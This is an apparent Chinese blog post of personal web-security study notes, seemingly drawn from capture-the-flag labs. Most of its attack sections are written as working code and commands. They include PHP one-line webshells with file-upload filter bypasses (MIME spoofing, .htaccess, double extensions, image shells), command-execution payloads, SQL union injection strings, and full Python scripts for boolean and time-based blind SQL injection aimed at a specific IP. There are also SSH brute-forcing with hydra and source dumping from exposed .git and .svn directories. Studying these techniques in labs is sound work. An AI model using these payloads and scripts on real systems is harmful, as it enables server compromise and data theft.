---
title: 学习网络安全的一些笔记
published: 2026-07-15
description: '自学网安时做的笔记，持续更新'
image: ''
tags: [网安]
category: '网安'
draft: false 
lang: ''
---
# 文件上传漏洞利用
上传成功后访问网址/文件名并利用webshell命令得到flag

```
reader=system('ls')
reader=system('ls/');   (发现有flag的文件）
reader=system('cat/文件名');
```

# 前端JS防护
利用前端javascript来对文件上传的文件进行检查，尽管开发人员利用javascript来对文件的检查已经达到完美的程度了，但是防线是在浏览器，并不是由服务器后端来进行，所以常常面临被攻击者利用抓包工具（BurpSuite等）直接绕过前端的校验，将文件上传到了服务器。
首先尝试上传一个写了一句话木马
```<?php eval($_POST['reader']);?>```
的shell.php文件。也可以传入文件后在bp修改文件名与文件内容。
发现是不允许的，通过按F12打开浏览器的前端控制台，发现存在前端检验上传的文件后缀的JS代码，这种检验方式是存在绕过jp的危险的！
```var allow_ext = ".jpg | .gif | .png"```
这里采用的绕过方式是先将木马文件的后缀名改为.jpg结尾的，这样前端js就不会拦截了。
然后用抓包修改工具BurpSuite抓到文件上传的请求包后，再手动将.jpg结尾改成.php结尾的，可以发现已经成功上传了。并且得到了文件的所在位置（filename= ''shell.php")


# MIME检查
MIME(MultipurposeInternetMailExtensions)多用途网络邮件扩展类型，可被称为Mediatype或Contenttype，在文件上传领域常常用来检查上传文件的类型，但是MIME是可以被伪造的，因此用来防护对恶意文件的上传的效果并不出众。
首先尝试上传一个写了一句话木马
```<?php@eval($_POST['reader']);?>```
的shell.php，验证一下后端的判断是什么，为了方便就利用BurpSuite的重放功能。
可以发现当我们传入一个php文件的时候，后端警告文件的类型不符合。
直接将上面repeater选项中的文件名后缀修改为.jpg后缀后，发送请求包后，发现还是不合格，说明并不是对文件后缀进行防护。
尝试修改了Content-Type为合法的image/jpeg时，发现不管文件内容和文件后缀的不合法，依旧成功上传，说明后端是检验MIME的，因此只要修改MIME就可以绕过成功上传(在filename的下面一句有Content-Type: )


# 文件后缀黑名单机制
该机制在文件上传中的防护机制是将可能作为危险的文件的后缀名给列入黑名单中，当上传的文件后缀名存在黑名单里的则不允许通过。但是在安全防护中，常常无法保证黑名单里的后缀名能够包含所有能够成为恶意文件载体的后缀名，因此防护效果也是有限度的。
尝试上传php文件（搭配了MIME的伪造）失败。可以发现提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！说明后端对这几类后缀的文件有限制了。
尝试上传内容为一句话木马，后缀名为.jpg的发现成功，同时发现程序还将名字重新命名了。(response的div中发现img的src与文件名不一样）
php服务器一般除了解析.php结尾的文件，同时还可以解析.phtml、.php5等后缀的文件，可以将文件内容当作php来执行，因此可以将文件后缀名修改纬.phtml，成功上传。


# 文件内容检查手段
除了对文件后缀名进行检查，一些安全意识较高的开发者也会对用户上传的文件内容进行检查，查看是否符合安全的标准。但是他们利用的函数或者自定义的方法对文件内容是否合法的判定标准并不完善，因此攻击者还是可以利用图片木马等方式上传了恶意的木马到服务器，然后配合Web服务器存在的文件包含等其它漏洞拿下服务器。
图片马的制作方式有很多种，为了图片能正常显示，一般都是用winhex或者010editor这种可以进行图片的16进制编辑的工具，也可以使用windows自带的cmd命令来合成
在桌面上创建一个php文件，里面的内容写入
```<?php@eval($_POST['reader']);?>```
启动一个cmd窗口，然后路径切换到桌面，输入命令copy /b （图片文件名）+shell.php shell.jpg
然后将其上传，用burp抓包可以看到一句话木马图片马正常上传
图片在不能利用解析漏洞的情况下，只能以图片的形式解析


# .htaccess文件介绍
该文件是Apache分布式配置文件。Apache主配置文件通过AllowOverride指令配置.htaccess文件中可以覆盖主配置文件的那些指令，在低于2.3.8的版本中，AllowOverride指令默认是All，说明.htaccess存在可以覆盖主配置文件所有指令的可能，但在2.3.9及更高版本中默认是None，说明在高版本中.htaccess已经没有任何作用。因此在低于2.3.8版本的Apache，我们可以通过上传.htaccess文件来修改部分配置文件，比如使用SetHandler指令市php解析指定文件。
这一关可以利用一个小技巧，为了探测有没有漏网之鱼（黑名单之外的危险文件），我们可以利用模糊测试（FUZZ）的概念，利用burpsuite工具的爆破模块Intruder配合后缀名字典，来测试出有哪些后缀名没有在黑名单之内。随便上传一个jpg文件，然后将数据包发送到Intruder选项中，将jpg后缀置为变量。
然后加载一个fuzz字典，字典文件在工具包中，名为fuzz.txt。
加载完成后，点击Startattack开始fuzz，然后使用length进行排序。可以发现有一个非常危险的漏网之鱼.htaccess文件，通过.htaccess文件，我们可以让服务器用php解析指定文件，通俗来说，即使我们上传了jpg文件，也可以利用.htaccess把这个jpg文件里的php代码给解析成功。
创建内容为SetHandlerapplication/x-httpd-php的.htaccess文件，并将其上传
然后再上传写有一句话木马的jpg后缀的文件。
访问shell.jpg，POST这个reader=phpinfo();可以发现成功执行。


# Apache多后缀名解析漏洞
在Apache中，单个文件支持拥有多个后缀，如果多个后缀都存在对应的handler或mediatype，那么对应的handler会处理当前文件。在AddHandlerapplication/x-httpd-php.php配置下，x.php.jpg文
2件会使用application/xhttpd-php处理当前文件。这其实并不是Apache的问题，而是开发人员的配置不当造成的问题
文件后缀白名单机制：白名单机制是一种比黑名单机制更为有效的防护手段，顾名思义上传的文件的后缀名只有存在白名单里，才能证明它是安全的。虽然该防护机制效果还不错，可以有效拦截许多的攻击，但是攻击者常常借助Web服务器的各解析漏洞或者ImageMagick等组件漏洞绕过了防护机制。
通过FUZZ模糊测试并未找到漏网之鱼的同时在排除了MIME检查和文件内容检查的前提下，随便上传了.1后缀的文件，发现依旧不行，说明不是利用黑名单机制，因为黑名单机制不可能包含那么多无用后缀名。因此判定是白名单，并且是只能运行jpg、gif、png的
这种情况下除了利用文件包含来包含我们的图片马的情况下，还可以利用中间件的问题来进行绕过，这里利用Apache的多后缀名解析漏洞。ApacheHttpd支持一个文件拥有多个后缀，不同的后缀执行不同的命令，也就是说当我们上传的文件中只要后缀名含有php，该文件就可以被解析成php文件，利用Apachehttpd这个特性，就可以绕过上传文件的白名单。
16该漏洞和apache版本和php版本无关，属于用户配置不当造成的解析漏洞，尤其是使用module模式与php结合的所有版本。apache支持php有多种模式，常见的有module、cgi、fastcgi等，此漏洞存在于module模式，由于管理员的错误配置，AddHandlerapplication/x-httpd-php.php，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。利用方法很简单直接上传一个以.php.jpg结尾的一句话木马文件即可

# 命令执行
## 虚拟机window10的google：(POST)
						f12+Hacker
						url
                        ```
						system("ls -al");
						system("cat flag");
                        ```

## (GET)
```
	system("ls -al");
	system("tac flag.php")
```
## 有限制
```
	system("tac ????.???")
```
## 对system有限制
```
	$name='f'.'lag'.'.ph'.'p';
	$data= file_get_contents($name);
	echo $data; 
```

# ASCII编码表
控制字符区：前32个编码值()为控制字符，如NUL(空字符)、STX(文本开始)等。
可打印字符规律：
数字(48-57)二进制值从110000开始
大写字母(65-90)二进制值从1000001开始
小写字母(97-122)二进制值从1100001开始
编码设计特点：数字与字母间填充标点符号保持对齐，字母编码采用前缀+序号的方式。
编码转换
Python转换函数：
ord()：获取字符的ASCII编码值，如ord('a')返回97
chr()：根据编码值获取对应字符，如chr(97)返回'a'

# Base系列编码
图片的二进制数据
Base64编码可将二进制数据转换为纯文本形式
通过Base64编码将的字节值转换为ASCII码中的可见字符
编码方式
四步编码流程：
二进制转换：将字符按ASCII编码转为8bit二进制
切片重组：将二进制序列切分为等长组（4/5/6bit）
查表转换：将每组转为十进制后查表对应可打印ASCII字符
补零规则：不足位补0，补零部分编码为'='
三种编码形式：
Base16：4bit分组，字母表为0-9+大写字母A-F
Base32：5bit分组，字母表为大写字母A-Z+数字2-7
Base64：6bit分组，字母表含大小写字母a-z，A-Z、数字0-9及符号+/
编码表结构：
索引0-63分别对应字符（0-25）、（26-51）、（52-61）及/$（62-63）
题目特征：
包含大小写字母、数字及符号
末尾可能含个'='补位符

# 其他编码
URL编码：用于处理网站地址中的特殊字符（如空格、中文字符），确保浏览器能正常访问
莫尔斯电码：二战时期用于传输消息的编码系统，通过长短信号组合表示字符
HTML实体编码：用于在HTML文档中显示特殊字符（如<、>、&等）
Shellcode编码：用于计算机安全领域的特定编码方式
Quoted-printable编码：主要用于电子邮件传输的编码方式
XXencode/UUencode编码：二进制到文本的编码方案
Unicode编码：国际通用的字符编码标准
Escape/Unescape编码：用于转义特殊字符的编码方式
敲击码(Tap code)：通过敲击次数和间隔传递信息的编码系统



# 整型注入
```
1 or 1=1 --
```

# 字符型注入
```
'1' or 1=1 --

--
--+
#
```
## 查看表的列数
```
1 order dy (列数)
```

## 建表
```
-1 union select " "," "
```
## 查数据库
```
-1 union select "no1",group_concat(schema_name) from information_schema.schemata
```
## 查表
```
-1 union select "no1",group_concat(table_name) from information_schema.tables where table_schema='数据库'
```

## 查字段
```
-1 union select "no1",group_concat(column_name) from information_schema.columns where table_schema='数据库' and table_name='表'
```

## 查数据
```
-1 union select "no1",字段 from 数据库.表
```
# 字符型
```
'-1 union select "no1",group_concat(schema_name) from information_schema.schemata#
```
# 布尔注入
```
1 and left()=
1 and substr((select schema_name from information_schma.schemata limit {},1),{j},1)='{k}'
```
例子
```
import requests
import time

url_data="http://8.138.2.3:64684/"

dir_sql="abcdefghijklmnopqrstuvwxyz_-1234567890"
dbn=[]

for i in range(8):
    dbname=""
    for j in range(20):
        for k in dir_sql:
            data_data={"id":f"1 and substr((select schema_name from information_schema.schemata limit {i},1),{j},1)='{k}'"}
		//改的时候select不要动
		//下一步时i可以改成1
            print(data_data)
            res=requests.post(url=url_data,data=data_data)
            if "query_success" in res.text:
                dbname+=k
                print(dbname)
                time.sleep(5)
    dbn.append(dbname)
print(dbn)
```

# 时间盲注
例子
```
import requests
import time

# 目标配置（根据实际场景修改）
url_data = "http://8.138.2.3:64669//"  # 目标注入地址
dir_sql = "abcdefghijklmnopqrstuvwxyz_-1234567890{}[]@!#"  # 字符字典，新增CTF常见符号
result_list = []  # 存储最终查询结果
delay_time = 3    # 延迟秒数（与SQL中的sleep一致）
timeout = 5       # 请求超时时间（需大于delay_time）

# 遍历行（limit {i},1 逐行取lptoetzp字段数据）
for i in range(1):  # 假设最多8行数据，可根据实际调整
    row_content = ""  # 存储单行完整内容
    # 遍历字符位（逐字符截取，最多30位，可调整）
    for j in range(1, 100):  # substr索引从1开始，必改！
        # 遍历字符字典，匹配当前位字符
        for k in dir_sql:
            # 构造时间盲注语句（整数型，无引号，直接拼接）
            # 若为字符型，修改为：f"1' and if(substr((select lptoetzp from w7f0n32q.voftxdoj limit {i},1),{j},1)='{k}', sleep({delay_time}), 0) -- "
            inject_sql = f"1 and if(substr((select ezke46kr from lhtvzu5o.i0nqmmq5 limit {i},1),{j},1)='{k}', sleep({delay_time}), 0)"
            data_data = {"id": inject_sql}
            print(f"正在匹配第{i+1}行第{j}位：{k} | 注入语句：{inject_sql}")
            
            try:
                # 记录请求开始时间
                start_time = time.time()
                # 发送请求，关闭重定向，设置超时
                res = requests.post(
                    url=url_data,
                    data=data_data,
                    allow_redirects=False,
                    timeout=timeout
                )
                # 计算实际响应时间
                response_time = time.time() - start_time
                # 判断是否延迟：响应时间≥延迟秒数的80%，即认为匹配成功（避免网络波动）
                if response_time >= delay_time * 0.8:
                    row_content += k
                    print(f"匹配成功！第{i+1}行当前结果：{row_content}")
                    time.sleep(0.5)  # 降低请求频率，避免被拦截
                    break  # 跳出字符循环，匹配下一位
            except requests.exceptions.Timeout:
                # 超时也判定为匹配成功（极端延迟场景）
                row_content += k
                print(f"超时匹配成功！第{i+1}行当前结果：{row_content}")
                time.sleep(0.5)
                break
            except Exception as e:
                print(f"请求异常：{e}，跳过当前字符")
                continue
    # 单行匹配完成，加入结果列表
    if row_content:
        result_list.append(row_content)
    print(f"第{i+1}行匹配完成：{row_content}\n" + "-"*80)

# 打印最终结果
print("="*100)
print(" 时间盲注最终查询结果：")
for idx, content in enumerate(result_list):
    print(f"第{idx+1}行：{content}")
if not result_list:
    print("未匹配到任何数据，请检查目标地址/表名/字段名是否正确")

--dbs
```

# 服务器
nmap使用：-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；
-O：启动操作系统检测；
-A：启动操作系统版本检测；
-PE/PP/PM：使用ICMP echo、ICMP timestamp、ICMP netmask请求包发现主机；
-PS/PA/PU/PY：使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现；
-sV：指定NMAP进行服务版本扫描。
nmap -p 范围始-范围末 主机ip

# 旁站，C段
主机 C 段通常指 IPv4 地址中前三个 8 位组（即前三个十进制段）相同的 / 24 网段（子网掩码 255.255.255.0），包含 256 个连续 IP 地址（0-255），常用于标识同一物理或逻辑子网内的主机群。
nmap -sV -p 1-65535 ip 扫描目标主机获取旁站信息
nmap -sn /24命令，扫描目标主机获取C段信息 （-sn只进行主机发现，不扫描端口，24代表子网掩码255.255.255.0）

# .git源码
在浏览器输入ip/.git,访问.git确认其是否存在。
执行命令cd /GitHack-master（可以输入/G后按Tab键补全），切换至GitHack-master目录。（注意cd后加空格）
再执行命令python GitHack.py https：//（p）.git，下载.git源代码
执行命令ls（ip），验证源代码下载结果（有any DVMA)
git --help

# .svn源代码泄露
在浏览器输入ip/.svn,访问.svn确认其是否存在。
在终端中执行命令cd/svnExploit-master（可以输入svn后按Tab键补全），切换至svnExploit-master目录
执行命令python  SvnExploit.py -u  http://（ip）/.svn --dump,将svn源码下载到本地
执行命令cd dbs，切换至dbs目录。执行命令ls，查该目录中的所有文件。
执行命令ls （ip），查看是否成功下载目标主机内的网站站点文件

# subDomainsBrute工具子域名枚举发现子域名
执行命令cdsubDomainsBrute-master，进入该目录下
执行命令python3 subDomainsBrute.py 域名，对该域名进行子域名收集。再执行命令ls，可发现扫描到的子域名都在对应域名的txt文件里
为了进一步确认结果，用命令打开生成的txt文件，执行命令cat 文件名，发现存在子域名
（可以直接在浏览器中搜索域名查询信息）

# Sublist3r-master工具对目标域名收集以及获取其子域名
执行命令cdSublist3r-master，进入该目录下，执行命令pythonsublist3r.py -d qianxin.com-o qianxin.txt（-d，枚举指定域名的子域名；-o，将结果保存为文本文件），枚举qianxin.com的子域名，并将结果保存至qianxin.txt文件中（例）
执行命令catqianxin.txt，查看保存的子域名
（还可以通过证书透明性信息发现子域名：在浏览器地址栏中输入https://crt.sh/，在页面的搜索框中输入你想要查询的域名）

# 扫描网址端口
dirseach -u (网址）

200有文件

扫描到ssh后使用密码本爆破：hydra -l root -P ssh.txt ssh://(ip) -Vv

# Burp Suite探测敏感信息路径
选中手动代理配置前的单选按钮，HTTP代理设置为环回地址127.0.0.1，将端口设置为与Burp  Suite工具一致的8080端口，将不使用代理下方文本框中的内容删除，全部设置好后单击【确定】按钮，完成代理设置
打开Burp Suite工具，单击Interceptis off按钮，会变为interceptis on，说明Burp Suite已经开启拦截
返回浏览器，刷新页面，Burp Suite工具就会抓取到数据包
单击Proxy模块中的HTTP history模块，查看历史数据包。再右击网址，单击快捷菜单中的Sendto Intruder，将数据包发送至Intruder模块
选择Intruder→Positions选项，切换到Intruder栏目下的Position选项
被§符号包裹着的字段，并且它们都是高亮显示的，这些字段是Intruder在每次请求中都会更改的字段，单击右侧Clear§按钮，清空所有被§包裹着的字段
鼠标选中，单击右侧Add§按钮，这样就会让这个被选中的字符成为一个修改点
单击Intruder模块中的payloads模块，切换到payloads选项下，由于在上一步只设置了一个修改点，所以只需要根据默认配置生成一个攻击载荷列表即可，将payload type设置为Simple list
然后单击Load...按钮，加载字典
下滑至PayloadEncoding模块，单击URL-encodethese characters前的单选框，将单选框中的对勾取消，代表不转义特殊字符
单击右上角的Startatttack按钮，开始向服务器发送请求
爆破结束，单击Status按钮，状态码就会按照从小到大的顺序展示，其中200是存在且能够成功访问的文件或者目录的响应代码，成功爆破出敏感路径
